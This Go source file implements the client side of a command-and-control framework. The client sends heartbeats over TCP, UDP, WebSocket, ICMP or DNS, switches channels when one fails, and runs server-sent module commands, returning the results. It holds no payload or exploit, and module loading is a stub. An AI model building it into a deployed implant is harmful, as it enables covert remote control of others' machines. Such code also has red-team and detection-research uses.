package client

import (
    "context"
    "encoding/json"
    "sync"
    "time"

    "github.com/Cl0udRs4/dinot/internal/client/module"
    "github.com/Cl0udRs4/dinot/internal/client/protocol"
)

// Config represents the client configuration
type Config struct {
    // ID is the client ID
    ID string
    
    // Name is the client name
    Name string
    
    // ServerAddresses is a map of protocol names to server addresses
    ServerAddresses map[string]string
    
    // HeartbeatInterval is the interval between heartbeats
    HeartbeatInterval time.Duration
    
    // ProtocolSwitchThreshold is the number of failures before switching protocols
    ProtocolSwitchThreshold int
}

// Client represents a C2 client
type Client struct {
    config        Config
    protocolMgr   *protocol.ProtocolManager
    moduleMgr     *module.ModuleManager
    ctx           context.Context
    cancel        context.CancelFunc
    wg            sync.WaitGroup
    heartbeatTick *time.Ticker
    mu            sync.RWMutex
}

// NewClient creates a new client
func NewClient(config Config) (*Client, error) {
    // Create protocols
    protocols := make([]protocol.Protocol, 0)
    
    if addr, ok := config.ServerAddresses["tcp"]; ok {
        protocols = append(protocols, protocol.NewTCPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["udp"]; ok {
        protocols = append(protocols, protocol.NewUDPProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["ws"]; ok {
        protocols = append(protocols, protocol.NewWSProtocol(addr))
    }
    
    if addr, ok := config.ServerAddresses["icmp"]; ok {
        protocols = append(protocols, protocol.NewICMPProtocol(addr))
    }
    
    if domain, ok := config.ServerAddresses["dns_domain"]; ok {
        if server, ok := config.ServerAddresses["dns_server"]; ok {
            protocols = append(protocols, protocol.NewDNSProtocol(domain, server))
        }
    }
    
    if len(protocols) == 0 {
        return nil, protocol.ErrNoProtocolAvailable
    }
    
    ctx, cancel := context.WithCancel(context.Background())
    
    return &Client{
        config:        config,
        protocolMgr:   protocol.NewProtocolManager(protocols, config.ProtocolSwitchThreshold),
        moduleMgr:     module.NewModuleManager(),
        ctx:           ctx,
        cancel:        cancel,
        heartbeatTick: time.NewTicker(config.HeartbeatInterval),
    }, nil
}

// Start starts the client
func (c *Client) Start() error {
    err := c.protocolMgr.Connect(c.ctx)
    if err != nil {
        return err
    }
    
    // Start heartbeat goroutine
    c.wg.Add(1)
    go c.heartbeatLoop()
    
    // Start command handler goroutine
    c.wg.Add(1)
    go c.commandLoop()
    
    return nil
}

// Stop stops the client
func (c *Client) Stop() error {
    c.cancel()
    c.heartbeatTick.Stop()
    c.wg.Wait()
    return c.protocolMgr.Disconnect()
}

// heartbeatLoop sends periodic heartbeats to the server
func (c *Client) heartbeatLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        case <-c.heartbeatTick.C:
            c.sendHeartbeat()
        }
    }
}

// sendHeartbeat sends a heartbeat to the server
func (c *Client) sendHeartbeat() {
    heartbeat := map[string]interface{}{
        "type":      "heartbeat",
        "client_id": c.config.ID,
        "timestamp": time.Now().Unix(),
    }
    
    data, err := json.Marshal(heartbeat)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// commandLoop receives and processes commands from the server
func (c *Client) commandLoop() {
    defer c.wg.Done()
    
    for {
        select {
        case <-c.ctx.Done():
            return
        default:
            c.processNextCommand()
        }
    }
}

// processNextCommand processes the next command from the server
func (c *Client) processNextCommand() {
    data, err := c.protocolMgr.Receive(5 * time.Second)
    if err != nil {
        // Handle timeout or other errors
        time.Sleep(1 * time.Second)
        return
    }
    
    var command struct {
        Type   string          `json:"type"`
        Module string          `json:"module,omitempty"`
        Params json.RawMessage `json:"params,omitempty"`
    }
    
    err = json.Unmarshal(data, &command)
    if err != nil {
        // Log error
        return
    }
    
    switch command.Type {
    case "execute_module":
        c.handleExecuteModule(command.Module, command.Params)
    case "load_module":
        c.handleLoadModule(command.Module, command.Params)
    case "unload_module":
        c.handleUnloadModule(command.Module)
    }
}

// handleExecuteModule handles the execute_module command
func (c *Client) handleExecuteModule(moduleName string, params json.RawMessage) {
    result, err := c.moduleMgr.ExecuteModule(c.ctx, moduleName, params)
    
    response := map[string]interface{}{
        "type":      "module_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   err == nil,
    }
    
    if err != nil {
        response["error"] = err.Error()
    } else {
        response["result"] = result
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// handleLoadModule handles the load_module command
func (c *Client) handleLoadModule(moduleName string, params json.RawMessage) {
    // This is a placeholder for module loading logic
    // In a real implementation, this would dynamically load a module based on the module name
    
    response := map[string]interface{}{
        "type":      "module_load_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   false,
        "error":     "Dynamic module loading not implemented",
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// handleUnloadModule handles the unload_module command
func (c *Client) handleUnloadModule(moduleName string) {
    err := c.moduleMgr.UnloadModule(moduleName)
    
    response := map[string]interface{}{
        "type":      "module_unload_result",
        "client_id": c.config.ID,
        "module":    moduleName,
        "success":   err == nil,
    }
    
    if err != nil {
        response["error"] = err.Error()
    }
    
    data, err := json.Marshal(response)
    if err != nil {
        // Log error
        return
    }
    
    err = c.protocolMgr.Send(data)
    if err != nil {
        // Log error
    }
}

// GetSupportedModules returns a list of supported modules
func (c *Client) GetSupportedModules() []string {
    return c.moduleMgr.GetModules()
}
